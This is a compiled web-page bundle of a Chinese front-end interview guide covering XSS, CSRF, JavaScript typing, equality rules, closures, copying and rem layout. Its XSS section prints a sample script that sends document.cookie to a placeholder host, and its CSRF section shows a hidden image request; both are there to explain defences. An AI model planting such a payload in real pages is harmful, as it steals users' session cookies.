(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{369:function(t,s,a){"use strict";a.r(s);var n=a(14),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"面试题集合"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#面试题集合"}},[t._v("#")]),t._v(" 面试题集合")]),t._v(" "),a("h2",{attrs:{id:"web常见网络攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#web常见网络攻击"}},[t._v("#")]),t._v(" web常见网络攻击")]),t._v(" "),a("h3",{attrs:{id:"xss攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击"}},[t._v("#")]),t._v(" XSS攻击")]),t._v(" "),a("p",[t._v("场景：恶意攻击者小t发现了某网站有一个没有添加XSS防御机制的留言功能，小t直接在漏洞位置（一般是"),a("code",[t._v("input")]),t._v("框）添加了以下代码:")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script type"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text/javascript"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<img src=\'http://xxx.xxx.xxx?c="')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\'>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("留言一发布，这张图片就会暴露在留言板中。其他好奇宝宝一进入，自己的token就随着这个"),a("code",[t._v("img")]),t._v("标签发送到恶意服务器中了！")]),t._v(" "),a("p",[t._v("解决方案：")]),t._v(" "),a("p",[t._v("将所有请求数据进行敏感内容过滤。如："),a("code",[t._v("<script>")]),t._v(" "),a("code",[t._v("/?^*()")]),t._v("等等。要注意的是，我们应尽量使用成熟的转义库，因为我们单靠自己无法想出所有可能情况。（如大小写、html自带的容错机制、"),a("strong",[t._v("利用过滤后的语句再次构成攻击")]),t._v("等）")]),t._v(" "),a("p",[t._v("并且，xss攻击的预防一般是在"),a("strong",[t._v("后端")]),t._v("进行处理，绕过前端验证的方法太过简单！")]),t._v(" "),a("h3",{attrs:{id:"csrf攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击"}},[t._v("#")]),t._v(" CSRF攻击")]),t._v(" "),a("p",[t._v("场景：小 t 在浏览一个常用的站点，突然发现站点顶部出现了一个弹框：“您的电脑存在高危漏洞！请及时修复！”小明点击之后发现自己来到了一个空白页，没过多久，发现自己常用的帐号已经被盗取了！")]),t._v(" "),a("p",[t._v("原理：原名"),a("strong",[t._v("跨站请求伪造")]),t._v("，站点的登录信息一般都是存储在"),a("strong",[t._v("cookie")]),t._v("中，之后的每个请求，都会将"),a("strong",[t._v("cookie")]),t._v("携带。"),a("strong",[t._v("第三方恶意站点")]),t._v("会把请求链接隐藏在一些隐蔽的或充满引导性的按钮中，用户一旦点击，"),a("strong",[t._v("就会携带上包含了个人信息或登录信息的cookie跳转到恶意站点")]),t._v("，恶意站点就拥有了你的登录权限。")]),t._v(" "),a("p",[t._v("如：")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[t._v("由于"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("标签的跨域特性，可以无视同源策略\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),a("span",{pre:!0,attrs:{class:"token style-attr language-css"}},[a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("style")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('="')]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("width")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://csrf.com"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])]),a("p",[t._v("因为"),a("strong",[t._v("同源策略")]),t._v("的保护，CSRF攻击一般会跳转第三方站点中，这样更方便操控攻击，但是也可能是因为网站存在高危漏洞而发生在同源站点中！")]),t._v(" "),a("p",[t._v("解决方法1")]),t._v(" "),a("p",[t._v("直接拦截用户第三方链接跳转：在用户通过链接跳转站外时进行拦截，提醒用户是否是主动跳转，并提示用户恶意站点。")]),t._v(" "),a("p",[t._v("解决方法2：")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work",target:"_blank",rel:"noopener noreferrer"}},[a("strong",[t._v("CSRF Token")]),a("OutboundLink")],1)]),t._v(" "),a("ol",[a("li",[a("p",[t._v("在用户进入站点时随机生成一个 CSRF Token（不同于信息token，而且不保存在cookie中），传递给用户并保存在服务器 session 中")])]),t._v(" "),a("li",[a("p",[t._v("在相关链接的中（如在query中）添加该 CSRF Token")]),t._v(" "),a("p",[a("code",[t._v("GET https:**//xxx.com?csrftoken=random**")])])]),t._v(" "),a("li",[a("p",[t._v("服务器接收用户请求，先对比 CSRF Token，再验证cookie信息")])])]),t._v(" "),a("p",[t._v("由于恶意站点无法对操作原站点的信息，以这样双重验证的形式，一明一暗，确保用户信息安全。")]),t._v(" "),a("h3",{attrs:{id:"控制台注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#控制台注入"}},[t._v("#")]),t._v(" 控制台注入")]),t._v(" "),a("p",[t._v("场景：诱骗不懂技术的小白在控制台输入了恶意代码")]),t._v(" "),a("p",[t._v("解决方法：只需要在在控制台中添加提示文字即可。")]),t._v(" "),a("h3",{attrs:{id:"钓鱼"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#钓鱼"}},[t._v("#")]),t._v(" 钓鱼")]),t._v(" "),a("p",[t._v("场景：通过一些谣言或非官方信息，将用户引导至"),a("strong",[t._v("官方高仿站点")]),t._v("，输入用户名和密码等信息。")]),t._v(" "),a("p",[t._v("解决方法：无…只能靠用户自己的意识了！")]),t._v(" "),a("h2",{attrs:{id:"javascript数据类型判断"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#javascript数据类型判断"}},[t._v("#")]),t._v(" JavaScript数据类型判断")]),t._v(" "),a("h3",{attrs:{id:"typeof"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#typeof"}},[t._v("#")]),t._v(" "),a("strong",[t._v("typeof")])]),t._v(" "),a("p",[t._v("主要用于判断基本数据类型（除了 null 以外），判断 null、object、array 时会返回 Object ，所以不可靠。")]),t._v(" "),a("div",{staticClass:"language-javascript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 正确判断的类型")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'number'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'1'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'string'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("undefined")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'undefined'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("true")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'boolean'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("Symbol")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'symbol'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" console"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("log "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'function'")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'object'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 'object'")]),t._v("\n\n")])])]),a("h3",{attrs:{id:"instanceof"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#instanceof"}},[t._v("#")]),t._v(" "),a("strong",[t._v("instanceof")])]),t._v(" "),a("p",[t._v("当需要判断对象的类型，或者说对象的来源，就可以用 "),a("code",[t._v("instanceof")]),t._v(",它会根据对象的原型链给出该对象的原型链上是否有后面的值。")]),t._v(" "),a("p",[t._v("如：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("function People (){}\nlet person = new People()\nconsole.log(person instanceof People) // true\nconsole.log(person instanceof Object) // true\n")])])]),a("h3",{attrs:{id:"object-prototype-tostring-call"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#object-prototype-tostring-call"}},[t._v("#")]),t._v(" "),a("strong",[t._v("Object.prototype.toString.call()")])]),t._v(" "),a("p",[t._v("最精确的判断数据类型的方法适用于所有类型，包括一些引用类型如："),a("code",[t._v("Date")]),t._v(" "),a("code",[t._v("RegExp")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("var toString = Object.prototype.toString;\n\ntoString.call(new Date); // [object Date]\ntoString.call(new String); // [object String]\ntoString.call(Math); // [object Math]\n\n//Since JavaScript 1.8.5\ntoString.call(undefined); // [object Undefined]\ntoString.call(null); // [object Null]\n\nvar arr = [1,2,3];\ntoString.call(arr); // [object Array]\n")])])]),a("h2",{attrs:{id:"判断-this-的值"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#判断-this-的值"}},[t._v("#")]),t._v(" 判断 this 的值")]),t._v(" "),a("p",[t._v("判断 this 的值按照以下顺序")]),t._v(" "),a("ol",[a("li",[t._v("是否存在 "),a("code",[t._v("new")]),t._v(" 绑定,若是，则this绑定为新建对象，否则继续")]),t._v(" "),a("li",[t._v("是否使用 "),a("code",[t._v("bind")]),t._v("硬绑定，若是，则为bind绑定的"),a("code",[t._v("thisArg")]),t._v(",否则继续")]),t._v(" "),a("li",[t._v("是否使用了 "),a("code",[t._v("call")]),t._v("或"),a("code",[t._v("apply")]),t._v("，若是，则为最后一次使用 "),a("code",[t._v("call")]),t._v("或"),a("code",[t._v("apply")]),t._v("绑定的"),a("code",[t._v("thisArg")]),t._v("，否则继续")]),t._v(" "),a("li",[t._v("是否存在"),a("strong",[t._v("上下文对象")]),t._v("的调用（对象调用函数），若是，则为该对象，否则继续")]),t._v(" "),a("li",[t._v("是否是严格模式，若是，则为"),a("code",[t._v("undefined")]),t._v(",否则指向全局对象（window或global）")])]),t._v(" "),a("h2",{attrs:{id:"和"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#和"}},[t._v("#")]),t._v(" == 和 ===")]),t._v(" "),a("p",[t._v("== 判断方法：")]),t._v(" "),a("ol",[a("li",[t._v("如果Type(x)和Type(y)相同，返回x===y的结果 , 否则")]),t._v(" "),a("li",[t._v("如果x是null，y是undefined，返回true")]),t._v(" "),a("li",[t._v("如果x是undefined，y是null，返回true")]),t._v(" "),a("li",[t._v("如果Type(x)是Number，Type(y)是String，返回 x==ToNumber(y) 的结果")]),t._v(" "),a("li",[t._v("如果Type(x)是String，Type(y)是Number，返回 ToNumber(x)==y 的结果")]),t._v(" "),a("li",[t._v("如果Type(x)是Boolean，返回 ToNumber(x)==y 的结果")]),t._v(" "),a("li",[t._v("如果Type(y)是Boolean，返回 x==ToNumber(y) 的结果")]),t._v(" "),a("li",[t._v("如果Type(x)是String或Number或Symbol中的一种并且Type(y)是Object，返回 x==ToPrimitive(y) 的结果")]),t._v(" "),a("li",[t._v("如果Type(x)是Object并且Type(y)是String或Number或Symbol中的一种，返回 ToPrimitive(x)==y 的结果")]),t._v(" "),a("li",[t._v("其他返回false")])]),t._v(" "),a("p",[t._v("其中的一些方法：")]),t._v(" "),a("ul",[a("li",[t._v("Type(x) : 获取x的类型")]),t._v(" "),a("li",[t._v("ToNumber(x) : 将x转换为Number类型")]),t._v(" "),a("li",[t._v("ToBoolean(x) : 将x转换为Boolean类型")]),t._v(" "),a("li",[t._v("ToString(x) : 将x转换为String类型")]),t._v(" "),a("li",[t._v("SameValueNonNumber(x,y) : 计算非数字类型x,y是否相同")]),t._v(" "),a("li",[t._v("ToPrimitive(x) : 将x转换为原始值")])]),t._v(" "),a("p",[t._v("简单来讲，若左右两边类型不同，会尽量往 number 类型转换，之后再比较。")]),t._v(" "),a("p",[t._v("有一道比较经典的题目：")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// true")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("false")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3.")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4.")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// true")]),t._v("\n")])])]),a("p",[t._v("=== 判断方法：")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("如果Type(x)和Type(y)不同，返回false")])]),t._v(" "),a("li",[a("p",[t._v("如果Type(x)和Type(y)相同")]),t._v(" "),a("ul",[a("li",[t._v("如果Type(x)是Undefined，返回true")]),t._v(" "),a("li",[t._v("如果Type(x)是Null，返回true")]),t._v(" "),a("li",[t._v("如果Type(x)是String，当且仅当x,y字符序列完全相同（长度相同，每个位置上的字符也相同）时返回true，否则返回false")]),t._v(" "),a("li",[t._v("如果Type(x)是Boolean，如果x,y都是true或x,y都是false返回true，否则返回false")]),t._v(" "),a("li",[t._v("如果Type(x)是Symbol，如果x,y是相同的Symbol值，返回true,否则返回false")]),t._v(" "),a("li",[t._v("如果Type(x)是Number类型\n"),a("ul",[a("li",[t._v("如果x是NaN，返回false")]),t._v(" "),a("li",[t._v("如果y是NaN，返回false")]),t._v(" "),a("li",[t._v("如果x的数字值和y相等，返回true")]),t._v(" "),a("li",[t._v("如果x是+0，y是-0，返回true")]),t._v(" "),a("li",[t._v("如果x是-0，y是+0，返回true")]),t._v(" "),a("li",[t._v("其他返回false")])])])])])]),t._v(" "),a("h2",{attrs:{id:"什么是闭包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是闭包"}},[t._v("#")]),t._v(" 什么是闭包")]),t._v(" "),a("p",[t._v("有些人对闭包的理解只是在于 函数返回函数 。这个结论并没有错，但是不全面，这只是JavaScript闭包机制的一部分（比较直观的一部分）。")]),t._v(" "),a("p",[t._v("闭包的核心在于：我们可以通过闭包"),a("strong",[t._v("间接地访问另个作用域内")]),t._v("的变量，并且只要存在引用，该作用域占用的"),a("strong",[t._v("内存就不会被释放")]),t._v("。")]),t._v(" "),a("p",[t._v("如果你真正理解了上面那句话那你就真正理解了闭包，你会发现闭包无处不在。")]),t._v(" "),a("h2",{attrs:{id:"深浅拷贝"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#深浅拷贝"}},[t._v("#")]),t._v(" 深浅拷贝")]),t._v(" "),a("h3",{attrs:{id:"浅拷贝"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浅拷贝"}},[t._v("#")]),t._v(" 浅拷贝")]),t._v(" "),a("p",[t._v("定义：将对象"),a("strong",[t._v("第一层的内容")]),t._v("拷贝到一个全新的对象中")]),t._v(" "),a("p",[t._v("方法1：")]),t._v(" "),a("p",[t._v("使用"),a("code",[t._v("Object.assign({},target)")]),t._v(",这个方法会将target第一层的内容复制到一个新对象中")]),t._v(" "),a("div",{staticClass:"language-javascript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" obj1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" test"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" obj2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Object"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("assign")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("obj1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("obj2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//{test: 1}")]),t._v("\n\n")])])]),a("p",[t._v("方法2:")]),t._v(" "),a("p",[t._v("使用 ES6 的扩展运算符 "),a("code",[t._v("...")])]),t._v(" "),a("div",{staticClass:"language-javascript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" obj1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" test"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" obj2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v("obj1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("obj2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//{test: 1}")]),t._v("\n\n")])])]),a("h3",{attrs:{id:"深拷贝"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#深拷贝"}},[t._v("#")]),t._v(" 深拷贝")]),t._v(" "),a("p",[t._v("定义：将对象的"),a("strong",[t._v("所有内容")]),t._v(" "),a("strong",[t._v("不含引用地")]),t._v(" 拷贝到一个全新的对象中")]),t._v(" "),a("p",[t._v("最常用的拷贝简单的套嵌对象可以直接使用 "),a("code",[t._v("JSON.stringify()")]),t._v("即可完成深拷贝")]),t._v(" "),a("div",{staticClass:"language-javascript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 形如obj,没有除了string、number、boolean、array、object以外的类型，没有递归调用")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("let")]),t._v(" obj "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n  b"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  \tc"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("复杂的深拷贝十分复杂，可以参照这篇文章https://juejin.im/post/5d6aa4f96fb9a06b112ad5b1")]),t._v(" "),a("p",[t._v("简单来说就是 "),a("strong",[t._v("数据类型判断")]),t._v(" 加上 "),a("strong",[t._v("递归遍历")]),t._v("，当然，实际上肯定没有那么简单")]),t._v(" "),a("h2",{attrs:{id:"手写call、apply、bind"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#手写call、apply、bind"}},[t._v("#")]),t._v(" 手写call、apply、bind")]),t._v(" "),a("h2",{attrs:{id:"rem原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#rem原理"}},[t._v("#")]),t._v(" rem原理")]),t._v(" "),a("p",[t._v("由于移动端屏幕大小不定的原因，使用 px 布局，会出现小屏显示不全，大屏显示太小的情况，这对用户体验是重大打击！所以就需要用到 rem 布局")]),t._v(" "),a("p",[t._v("rem是css中的一个单位。它并非一个固定值，它的大小由根元素（html标签）的"),a("code",[t._v("font-size")]),t._v("决定。如：根元素的"),a("code",[t._v("font-size:20px")]),t._v(",那么 1rem === 20px。")]),t._v(" "),a("p",[t._v("根据rem的这种特性，我们就可以"),a("strong",[t._v("通过屏幕大小动态改变根元素的"),a("code",[t._v("font-size")]),t._v("值")]),t._v("，再使用rem布局来适应不同屏幕的不同大小问题。")]),t._v(" "),a("p",[t._v("另外提一嘴：em指的是当前元素的，rem指根元素（ r : root）。")]),t._v(" "),a("p",[t._v("那么一般如何设置 font-size 呢？")]),t._v(" "),a("p",[t._v("JavaScript版：")]),t._v(" "),a("p",[t._v("使用 js 获取屏幕宽度，设置根元素"),a("code",[t._v("font-size")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("function calRootFontSize() {\n\t\tconst html = document.documentElement;\n    html.style.fontSize = html.getBoundingClientRect().width / 20 + 'px';\n}\n")])])]),a("p",[t._v("CSS版")]),t._v(" "),a("p",[t._v("巧妙地使用vw（可视宽度）单位，按照vw的百分比来配置。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("html{\n\t\tfont-size: 5.333333333vw; // 以iphone6为准\n}\n\n")])])]),a("h2",{attrs:{id:"响应式优缺点以及实现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#响应式优缺点以及实现"}},[t._v("#")]),t._v(" 响应式优缺点以及实现")]),t._v(" "),a("p",[a("strong",[t._v("优点：")])]),t._v(" "),a("ol",[a("li",[t._v("能够自动适配不同屏幕尺寸，实现跨平台")]),t._v(" "),a("li",[t._v("移动端和PC端可以给出友好的统一的布局界面")]),t._v(" "),a("li",[t._v("减少了开发和运维的成本")])]),t._v(" "),a("p",[a("strong",[t._v("缺点：")])]),t._v(" "),a("ol",[a("li",[t._v("由于移动端和PC端加载的是同一份资源，所以对移动端来说，增加了消耗（低分辨率的移动端加载了大于它显示能力的图片）")]),t._v(" "),a("li",[t._v("增加了多余的加载（如移动端加载了PC端的CSS文件）")]),t._v(" "),a("li",[t._v("代码太过庞大，某端的改动可能影响到其他界面的显示")]),t._v(" "),a("li",[t._v("不支持 IE6/7/8")])]),t._v(" "),a("p",[a("strong",[t._v("实现：")])]),t._v(" "),a("p",[t._v("最为常用的就是使用 CSS 的 "),a("code",[t._v("MediaQuery")])]),t._v(" "),a("p",[t._v("bootstrap栅格布局使用的"),a("code",[t._v("mediaQuery")])]),t._v(" 